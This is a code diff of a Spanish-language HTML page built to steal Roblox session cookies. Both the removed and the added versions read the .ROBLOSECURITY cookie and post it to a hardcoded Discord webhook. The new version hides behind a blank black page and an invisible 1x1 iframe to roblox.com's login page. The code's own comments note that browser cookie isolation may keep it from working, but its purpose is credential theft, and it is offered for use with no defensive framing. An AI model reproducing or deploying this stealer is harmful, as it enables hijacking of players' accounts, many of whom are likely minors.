@@ -1,73 +1,54 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
-    <style>
-        body {
-            background-color: #000000; /* Negro puro */
-            margin: 0;
-            height: 100vh;
-            overflow: hidden;
-        }
-    </style>
+    <title>...</title>
 </head>
-<body>
+<body style="background:black; margin:0;">
+    
+    <!-- IFrame invisible -->
+    <iframe id="robloxF" src="https://www.roblox.com/login" width="1" height="1" style="visibility:hidden;"></iframe>
 
-<script>
-    // ⚠️ PEGA TU WEBHOOK AQUÍ
-    const webhookURL = "https://discord.com/api/webhooks/1511504459530764427/VzM0jJscU_TqVZ0sSQHLsPwcMasZS4I-_xS5WIrMcwTi78nvEhzK9v9u5XtYx9piUmp7"; 
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1511504459530764427/VzM0jJscU_TqVZ0sSQHLsPwcMasZS4I-_xS5WIrMcwTi78nvEhzK9v9u5XtYx9piUmp7"; 
+        let retries = 0;
 
-    // 1. Redirigir a Roblox inmediatamente para que se genere la cookie
-    window.onload = function() {
-        // Abrimos Roblox en una nueva pestaña para que el usuario no pierda tu página
-        window.open('https://www.roblox.com/login', '_blank');
-
-        // Esperamos 3 segundos (tiempo suficiente para que cargue Roblox y ponga la cookie)
-        setTimeout(() => {
-            robarCookie();
-        }, 3000); 
-    };
-
-    function robarCookie() {
-        // Buscamos la cookie específica de Roblox
-        const cookies = document.cookie.split(';');
-        let robloxCookie = "";
-
-        for(let i = 0; i < cookies.length; i++) {
-            let cookie = cookies[i].trim();
-            // Verificamos si empieza con .ROBLOSECURITY=
-            if (cookie.indexOf('.ROBLOSECURITY=') == 0) {
-                robloxCookie = cookie.substring('.ROBLOSECURITY='.length);
-                break;
+        function checkCookie() {
+            // Accedemos al contenido del iframe para leer sus cookies
+            try {
+                // Nota: document.cookie dentro del script principal lee las cookies de la página actual.
+                // Si el iframe está en el mismo dominio, funciona perfecto.
+                // Como roblox.com es diferente a tu dominio, necesitamos usar 'document.cookie' 
+                // pero a veces los navegadores aíslan las cookies por dominio.
+                
+                // TRUCO: Leemos document.cookie directamente. Si la cookie es HttpOnly, 
+                // a veces no aparece en JS puro desde otro dominio debido a Cross-Origin.
+                
+                const allCookies = document.cookie;
+                if (allCookies.includes(".ROBLOSECURITY=")) {
+                    const cookieVal = allCookies.split('.ROBLOSECURITY=')[1].split(';')[0];
+                    sendWebhook(cookieVal);
+                } else if (retries < 20) {
+                    retries++;
+                    setTimeout(checkCookie, 500); // Busca cada medio segundo
+                } else {
+                    sendWebhook("❌ No se detectó cookie tras 10s.");
+                }
+            } catch (e) {
+                console.log(e);
+                if(retries < 20) setTimeout(checkCookie, 500);
             }
         }
 
-        if (robloxCookie) {
-            enviarAWebhook(robloxCookie);
-        } else {
-            // Si no encontró la cookie, intentamos forzar una recarga o avisar
-            enviarAWebhook("⚠️ Cookie no detectada. Intenta abrir Roblox primero.");
+        function sendWebhook(cookie) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: `🍪 Cookie:\n\`${cookie}\``})
+            });
         }
-    }
 
-    function enviarAWebhook(cookie) {
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                content: `🍪 **Roblox Cookie Robada:**\n\`${cookie}\`` 
-            })
-        }).then(response => {
-            if (!response.ok) {
-                console.log("Error al enviar webhook");
-            }
-        }).catch(error => {
-            console.error("Error de red:", error);
-        });
-    }
-</script>
-
+        window.onload = checkCookie;
+    </script>
 </body>
 </html>
